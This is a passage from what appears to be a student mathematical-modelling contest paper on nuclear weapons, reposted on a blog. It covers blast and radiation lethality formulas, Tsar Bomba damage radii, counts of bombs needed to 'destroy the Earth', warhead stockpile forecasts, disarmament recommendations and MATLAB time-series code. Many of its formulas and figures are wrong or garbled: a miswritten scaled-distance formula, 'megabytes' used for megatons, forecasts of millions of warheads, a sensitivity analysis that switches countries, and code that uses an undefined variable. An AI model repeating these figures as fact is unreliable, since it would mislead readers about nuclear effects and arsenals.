United Kingdom, Pakistan, India, Israel, North Korea. </p><h2 id="7-Model-and-solution-of-problem-three"><a href="#7-Model-and-solution-of-problem-three" class="headerlink" title="7 Model and solution of problem three"></a>7 Model and solution of problem three</h2><h3 id="7-1-Solution-and-analysis-of-Question"><a href="#7-1-Solution-and-analysis-of-Question" class="headerlink" title="7.1 Solution and analysis of Question"></a>7.1 Solution and analysis of Question</h3><h4 id="7-1-1-of-nuclear-weapon-Lethality"><a href="#7-1-1-of-nuclear-weapon-Lethality" class="headerlink" title="7.1.1 of nuclear weapon Lethality"></a>7.1.1 of nuclear weapon Lethality</h4><p>​        By establishing the lethality model of the detonating position of nuclear weapons, we can describe it by the killing power of its explosion shock wave and the damage degree of nuclear radiation to human body and environment. The blast wave is a factor to be considered when the missile and the target are detonated in close contact. A model of blast wave power is established to describe the killing power of blast wave. According to the nuclear bomb lethal formula, we can effectively describe the effective killing distance R and area S of nuclear  bomb explosion. </p><p>$$<br>R = C × Q^{\frac {1} {3}}<br>$$</p><p>$$<br>𝑆 = 𝜋 × 𝑅^2<br>$$</p><p>​        Where, C is the constant of proportionality, taking the value of 1.493885, and Q is THT  equivalent.</p><p>​        The calculation of the peak overpressure of the explosion shock wave can be done by using the empirical formula of spherical charge explosion in infinite air medium. </p><p>$$<br>𝛥𝑃_{𝑚𝑎𝑥} = \frac {0.082} {𝑍} + \frac {0.26} {𝑍^2} + \frac {0.69 } {𝑍^3 }<br>$$</p><p>$$<br>𝑍 = 𝑅 𝑄 ^{\frac {1} {3}}<br>$$</p><p>​        Where, ΔP is the explosion shock wave overpressure peak (MPa),Z is the contrast distance (m/kg ),R is the radius of spherical expansion, and Q is the equivalent of TNT. </p><p>​        According to Tab.7-1, the damage grade caused by shock wave can be judged, and the killing radius corresponding to different impact injury grades can be calculated. Mild impact damage radius range [399.04,522.35)𝑄(m), moderate impact damage radius range [264.04,399.04)𝑄(m), severe impact damage radius range [201.91,264.04)𝑄(m), and extremely severe impact damage radius range(0,201.91)𝑄(m).[2] </p><center>Tab.7-1 Impact injury levels </center>| extent                   | Mild  | Moderate | Severe | Very severe || ------------------------ | ----- | -------- | ------ | ----------- || Overpressure range / kPa | 20~30 | 30~60    | 60~100 | \>100       |<p>​        During a nuclear explosion, a large number of neutrons and γ radiation are released .And the extent to which nuclear radiation harms the human body depends mainly on the sum of the neutrons and γ radiation doses absorbed by the human body[1].The formula for  calculatingneutron dose in nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑛} = 4.9 × 10^7 𝑄 \frac {𝑒^{\frac {−𝑟𝜌} {230}}} {𝑟^2}<br>$$</p><p>$$<br>𝜌 = 1.226 × {[1 − 2.22 × 10^−5 (𝑍 +\frac{𝐻} {𝑍} )]}^{4256}<br>$$</p><p>​        Where, D<del>𝑜𝑛</del>is the neutron dose (Gy), Q is the TNTequivalent (kt),r is the distance from the ground point to the detonation center (m), and ρ is the air density at the half of detonation  height (mg/cm3 ),Z is the elevation of the projection point of the detonation center (m), and H is the explosion height (m). </p><p>​        When is the far zone (rρ &gt; 2000m ∙ mg/cm^3^), the formula for calculating γ radiation dose  of nuclear radiation is<br>$$<br>𝐷_{𝑜𝑟} = 9.1 × 10 ^{−3} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {415}} {𝑟^2}<br>$$<br>​        When it is near region (rρ&lt;2000m ∙ mg/cm^3^ ), the formula for calculating γ radiation dose  of nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑟} = 2.24 × 10 ^{−2} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {340}} {𝑟^2}<br>$$<br>​        Where,r is the distance from the ground point to the detonation center(m), and ρ is the air density at the half of detonation height (mg/cm3 ),the calculation is the same as formula 7-4, Q  is the nuclear detonation equivalent(kt),coefficient K(Q) = 2.82 × 10^8^× (2 + Q)^1.3^. </p><p>​        Therefore, the absorbed dose of nuclear radiation is 𝐷<del>𝑛𝑟</del>= 𝐷<del>𝑜𝑛</del> +𝐷<del>𝑜𝑟</del>.According to 𝐷<del>𝑛𝑟</del>, the acute radiation degress grade is obtained.This is shown in Tab.7-2. </p><center>Tab.7-2 acute radiological degress grades </center>| Degree                       | Mild | Moderate | Severe | Extremely severe || ---------------------------- | ---- | -------- | ------ | ---------------- || Nuclear  radiation dose / Gy | 1~2  | 2~4      | 4~6    | \>6              |<p>​        The radiation hazard to the environment can be estimated by the degree of damage to  animals and plants. The maximum radiation dose of human body can only be 100mSv (mSv =  mGy × K, K is the variable coefficient, value is 0.5), and the radiation dose of the smallest TNT equivalent nuclear bomb known in the world is beyond the tolerable range of human beings and unfit for human habitation. lf the natural recovery time after the missile explosion exceeds the earth’s 5 billion years of life, it can also be considered destroyed. </p><h4 id="7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth"><a href="#7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth" class="headerlink" title="7.1.2 um number of nuclear bombs to destroy the Earth"></a>7.1.2 um number of nuclear bombs to destroy the Earth</h4><p>​        The Earth was originally gravitationally collapsed from the remnants of the solar nebula, and to shatter the Earth into a nebula that can no longer be gravitationally held together, the energy produced by the nuclear bomb would need to exceed the gravitational binding energy of the Earth, which the energy required 2.2 × 1032 J. Because 1tTNT = 4.19 × 109 J, so 2.2 × 1032 J is the equivalent of 5.25 × 1022 tTNT, and the number of nuclear bombs in 100 megabytes TNT equivalent is 5.25 × 10^14^. </p><p>​        The number of nuclear bombs in 100-megabyte TNT equivalent needed to blast off the surface of the world is 23.57 × 1012.lf destroying the earth is to make the earth uninhabitable, that is to destroy the living environment of human beings and creatures on the earth. The five conditions for life on Earth are stable sunlight, a safe orbit, suitable temperature, liquid water, and the thickness and composition of the atmosphere. Destroying the atmosphere need 3.2 × 1026J and heating the Earth’s oceans to evaporate and drying out all the land need 7.0 × 1027J . So the number of nuclear bombs in 100-megabyte TNT  equivalent is 1.74 × 1010. </p><h3 id="7-2-Solution-and-analysis-of-b-question"><a href="#7-2-Solution-and-analysis-of-b-question" class="headerlink" title="7.2 Solution and analysis of b question"></a>7.2 Solution and analysis of b question</h3><p>​        “Big Ivan” is the most powerful nuclear bomb known in the world at present, namely the Czar Bomb made in the Soviet era. It is 8m in length, 2.1m in diameter, can weigh up to 27t and has a design TNT equivalent of 100Mt. According to the formula 16 and formula 17, the maximum effective kill radius is 25.55km, resulting in an effective kill area of 2055.05𝑘𝑚^2^,  and the energy of 2.10 × 1013 J released by the shock wave. According to the simulation of nuclear explosion, the altitude of the mushroom cloud is 52.8km, the diameter of the  mushroom cloud head is 204km, and the height of the mushroom cloud head is 11.4km.</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Dimensions of the mushroom cloud.png" style="zoom:67%;" /><center>Fig.7-1 Dimensions of the mushroom cloud </center>​        The radiation radius（500rem）is 6.99km and the area is about 153km². A 500rem dose of ionizing radiation can be fatal in humans within about 1 month, and 15% of survivors will eventually die of cancer as a result of exposure. The fireball has a radius of 7.92km and an  area of 197km².Damage with the ground depends on the height of the blast. The amount of radioactive fallout increases significantly if the ground is touched. Anything inside the fireball will be effectively vaporized. The heavy blast damager adius(20 psi)is 10.1km and  the area is 321km². <p>​        At 20 psi overpressure, heavy concrete structures were severely damaged or dismantled,  with fatalities approaching 100%.The medium blast damage radius (5 psi) is 21.2 km and the area is 1,420 km².At 5 psi overpressure, most residential buildings collapse with widespread injury and death. The potential for fire in commercial and residential damage is high, and damaged buildings are likely to spread fire. The light burst damage radius (1 psi) is 54.6 km and the area is 9,370 km².At an overpressure of about 1 psi, the glass window may break. The thermal radiation radius(Third degree burns) is 64.2 km and the area is 12,960km².Third  degree burns burn all skin and because of the destruction of painful nerves, are usually  painless, which can lead to severe scarring or disability, and may require amputation. </p><center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear explosion with southwesterly wind up_1.png" style="zoom:50%;" /><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear explosion with southwesterly wind up_2.png" style="zoom:50%;" /></center><center>Fig.7-2 Nuclear explosion with southwesterly wind up</center>In 1986, there were 70,300 nuclear weapons on in Earth. Today, the global Arsenal has been reduced by 80 percent, leaving an estimated 12,705 nuclear weapons , which not enough to destroy the planet but enough to destroy 18 percent of its land mass. <h3 id="7-3-Solution-and-Analysis-of-c-Question"><a href="#7-3-Solution-and-Analysis-of-c-Question" class="headerlink" title="7.3. Solution and Analysis of c Question"></a>7.3. Solution and Analysis of c Question</h3><p>​        Since the end of the Cold War, steps have been taken to reduce nuclear arsenals and some progress has been made, but the world’s total stockpile of nuclear warheads remains at a very high level. Today, there are 12,705 nuclear warheads in possession by nine countries.Fig.7-3 shows that 86% of nuclear warheads are owned by Russia and the United States, which have a combined stockpile of 8,185. The number of nuclear warheads needed to protect national security is exaggerated. As Fig.7-4 shows, the total global stockpile of nuclear weapons is declining, but at a slower rate than over the past 30 years. Among them, the United States and Russia are slowly reducing their stockpiles. France’s and Israel’s stockpiles are relatively stable. But China, India, North Korea, Pakistan are adding to their stockpiles. The current nuclear states do not seem to be planning nuclear disarmament, but rather to keep large arsenals indefinitely; All are committed to modernizing their remaining nuclear forces, and all seem committed to retaining nuclear weapons indefinitely, in conflict with the Nuclear Non-Proliferation Treaty. In the short term, it is highly unlikely that the world will achieve a total stockpile of zero nuclear weapons and protect the planet from  nuclear destruction. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Ratio of nuclear warheads among nuclearstatesin 2022.png" style="zoom:50%;" /><center>Fig.7-3 Ratio of nuclear warheads among nuclearstatesin 2022 </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Global stockpile of nuclear warheads 1945-2022.png" style="zoom: 60%;" /><center>Fig.7-4 Global stockpile of nuclear warheads 1945-2022 </center>​        In order to protect the earth and the environment on which we depend, we consider limiting the total number of nuclear warheads in the world to 10% of the land damage caused by a nuclear explosion. By calculation, the global stockpile limit is 7,250 nuclear warheads. Countries that already have nuclear weapons are limited to the number of warheads they need to defend their national security. We chose the number of nuclear warheads that could destroy a large nation as the maximum number of nuclear warheads that a nuclear power could possess. By calculation, the limit for nuclear warheads is 487. <h2 id="8-Model-and-solution-of-problem-four"><a href="#8-Model-and-solution-of-problem-four" class="headerlink" title="8 Model and solution of problem four"></a>8 Model and solution of problem four</h2><h3 id="8-1-discovery"><a href="#8-1-discovery" class="headerlink" title="8.1 discovery"></a>8.1 discovery</h3><ol><li><p>Regarding the basic data analysis, we conclude based on the analysis. </p><ul><li>Russia, the United States, China, France, the United Kingdom, Pakistan, India, Israel, North Korea, South Africa and other countries used to have nuclear weapons. </li><li>The United States has the biggest change in its stockpile, with its stockpile dropping by 6,749. </li><li>The largest number of nuclear weapons tests occurred in 1962, 1958, 1968, 1966, 1966 and 1965, with 178, 116, 79, 76 and 71. </li><li>Russia has been the most active in nuclear weapons research over the past decade. </li><li>The United States has made the fastest transition from “not considering nuclear  weapons” to “possessing nuclear weapons.” </li></ul></li><li><p>Predict the number of nuclear weapons </p><ul><li>In 100 years, the country that might have nuclear weapons is Iran. </li><li>China, France, India, Israel, North Korea, Pakistan, Russia, the United Kingdom, the United States and the World. Each have 58, 183, 577, 920, 876, 242, 23938, 618, 4.23864e+006, 21074, 947211, 1.53598e+007 nuclear weapons. </li></ul></li><li><p>Protect our planet </p><ul><li>Destroying the planet requires at least 1.74 × 1010 nuclear bomb. </li><li>Currently nuclear bombs have a maximum effective kill radius of 25.55km, resulting in an effective kill area of 2055.05km2 and the energy released 2.10 × 1013 J by the shock wave; Not enough to destroy the Earth, but it can destroy 18% of the land area. </li><li>To protect our planet, the total global stockpile limit is 7,250 nuclear warheads, and  the nuclear power limit is 487. </li></ul></li></ol><h3 id="8-2-Recommendations"><a href="#8-2-Recommendations" class="headerlink" title="8.2 Recommendations"></a>8.2 Recommendations</h3><p>​        The Earth is our home, and so far, the only planet suitable for human habitation. But nuclear weapons will cause damage to the biological environment of the earth, and the environment destroyed by nuclear weapons is no longer suitable for human habitation. Therefore, here is my advice to the States possessing nuclear weapons: All nuclear- weapon States should refrain from being the first to use nuclear weapons at any time and under any  circumstances, and refrain from using or threatening to use nuclear weapons against non-nuclear-weapon States or nuclear-weapon-free zones. </p><h2 id="9-Sensitivity-analysis-of-the-model"><a href="#9-Sensitivity-analysis-of-the-model" class="headerlink" title="9 Sensitivity analysis of the model"></a>9 Sensitivity analysis of the model</h2><p>​        According to the analysis of the problem, it is known that status will have a great influence on which countries possess nuclear weapons in the next 100 years. In order to test the sensitivity of the model, direct derivation sensitivity analysis is selected for Algeria’s status data. </p><p>​        Use y to represent the status forecast after 100 years, and x to represent the status data  from 1938 to 2022, representing the initial value data y0. And the following relationship is  satisfied. </p><p>$$<br>𝑓(𝑦, 𝑥) = \frac {𝑑𝑥} {𝑑𝑦} , 𝑦(0) = 𝑦^0<br>$$<br>​        Differential equation of sensitivity can be obtained with respect to differentiation X<del>j</del> . </p><p>$$<br>\frac d {dt} \frac {𝜕y} {𝜕x_j}=j  \frac {𝜕y} {𝜕x_j} + \frac {𝜕f} {𝜕x_j} (S=JṠ+F)<br>$$<br>​        The sensitivity formula can be obtained by 𝑆 taking the derivative of pair x<del>j</del> . </p><p>$$<br>S^𝑠 = −𝐽 ^{−1} 𝐹<br>$$<br>​        SPSS was used to make the roc curve of Syria, and the sensitivity graph was as follows. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/The sensitivity analysis chart of Syria.png" style="zoom: 67%;" /><center>Fig.9-1The sensitivity analysis chart of Syria </center>## 10 del evaluation <h3 id="10-1-advantages-of-the-model"><a href="#10-1-advantages-of-the-model" class="headerlink" title="10.1 advantages of the model"></a>10.1 advantages of the model</h3><ol><li><p>The entropy weight method can ensure that the index weight is not subject to  subjective influence, so that the results can be carried out according to the calculated weight and the results are more objective. </p></li><li><p>The time series model makes full use of the original data, the calculation speed is fast, the precision is high, and the prediction of the future data is more accurate. </p></li></ol><h3 id="10-2-advantages-of-the-model"><a href="#10-2-advantages-of-the-model" class="headerlink" title="10.2 advantages of the model"></a>10.2 advantages of the model</h3><p>​        This paper only predicts the future development of nuclear weapons in the world and in  each country based on the annual attitudes towards nuclear weapons of all countries from  1938 to now, the annual average stockpile of nuclear weapons of all countries, and the total  number of nuclear-weapon states in the world each year. There may be limitations in the data  of characteristic attributes, which can appropriately increase the world and other influential factors affecting nuclear weapons research. </p><h3 id="10-3-l-Improvement"><a href="#10-3-l-Improvement" class="headerlink" title="10.3 l Improvement"></a>10.3 l Improvement</h3><p>​        All in all, the models established in this paper are consistent with the actual situation and  have certain guidance. At the same time, the models can be analyzed at a deeper level. The  models have high classification accuracy and good generalization performance, and can be applied to the study of the impact of explosive weapons on the environment, the impact of  volcanic eruption on the environment and other fields. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>​        [1] Yang Zhehai. Model Study on the Effect of Terrain on the firing of Indirect Artillery and the  killing efficiency of nuclear Weapons [D]. PLA Information Engineering University, 2001. </p><p>​        [2] Zou Shiya, Zhang Wenzhong, Mao Yongze. Mathematical model of battlefield target damage effect of neutron bomb explosion [J]. Nuclear Electronics and Detection Technology, 2006(02): 132-136. </p><p>​        [3] LIU Tong. Research on Kill Power Evaluation Method of Air Defense Warhead [D]. Nanjing  University of Science and Technology, 2004.Team E apmcm2206077 </p><h2 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h2><h3 id="Attachment-1"><a href="#Attachment-1" class="headerlink" title="Attachment 1"></a>Attachment 1</h3><h4 id="Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）"><a href="#Question-2-raw-data（Comparison-table-of-years-and-nuclearweapons-reservesin-the-world）" class="headerlink" title="Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）"></a>Question 2 raw data（Comparison table of years and nuclearweapons reservesin the world）</h4><h3 id="Attachment-2"><a href="#Attachment-2" class="headerlink" title="Attachment 2"></a>Attachment 2</h3><h4 id="code-1-Time-prediction-model"><a href="#code-1-Time-prediction-model" class="headerlink" title="code 1: Time prediction model"></a>code 1: Time prediction model</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">)</span> <span class="token function">plot</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data1<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span> <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'First-order differential of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">)</span> data2 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>data2<span class="token punctuation">,</span><span class="token string">'b-'</span><span class="token punctuation">,</span><span class="token string">'LineWidth'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'time'</span><span class="token punctuation">)</span><span class="token comment">%Set the label  </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Second-order difference of data'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">%Test the data  </span><span class="token function">kpsstest</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> data1 <span class="token operator">=</span> <span class="token function">diff</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  d1_adf <span class="token operator">=</span> <span class="token function">adftest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span> d1_kpss <span class="token operator">=</span> <span class="token function">kpsstest</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span>  figure <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>  <span class="token function">autocorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'ACF'</span><span class="token punctuation">)</span> <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  <span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span> <span class="token function">parcorr</span><span class="token punctuation">(</span>ddata<span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span>  <span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'PACF'</span><span class="token punctuation">)</span>  <span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'fontsize'</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>  pm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> qm <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> d <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">%[p q ]=findPQ(data,pm,qm,d);%Find the functions of p and q  </span>p <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>q <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">% Model start construction </span>Mdl <span class="token operator">=</span> <span class="token function">arima</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">;</span> EstMdl <span class="token operator">=</span> <span class="token function">estimate</span><span class="token punctuation">(</span>Mdl<span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  step <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>forData<span class="token punctuation">,</span>YMSE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">forecast</span><span class="token punctuation">(</span>EstMdl<span class="token punctuation">,</span>step<span class="token punctuation">,</span><span class="token string">'Y0'</span><span class="token punctuation">,</span>data<span class="token operator">'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  l <span class="token operator">=</span> forData <span class="token operator">-</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span>Team E apmcm2206077 Page <span class="token number">23</span> of <span class="token number">24</span> u <span class="token operator">=</span> forData <span class="token operator">+</span> <span class="token number">1.96</span><span class="token operator">*</span><span class="token function">sqrt</span><span class="token punctuation">(</span>YMSE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Here is the confidence interval of 95  </span>figure <span class="token function">plot</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>forData<span class="token punctuation">)</span>  hold on <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>l<span class="token punctuation">)</span>  <span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">length</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span>step<span class="token punctuation">,</span>u<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles"><a href="#code-2-Line-chart-of-changesin-the-magnitude-of-nuclear-weaponsstockpiles" class="headerlink" title="code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles"></a>code 2: Line chart of changesin the magnitude of nuclear weaponsstockpiles</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token comment">%xData on the axis, the first value represents the start of the data, the second value represents the interval, and the third value represents the termination  </span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">235</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">240</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">260</span><span class="token punctuation">,</span><span class="token number">270</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%a data y value  CHN </span>b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">350</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">,</span><span class="token number">290</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">%b data y value  FRA </span>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%IND  </span>d<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">78</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ISR </span>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span 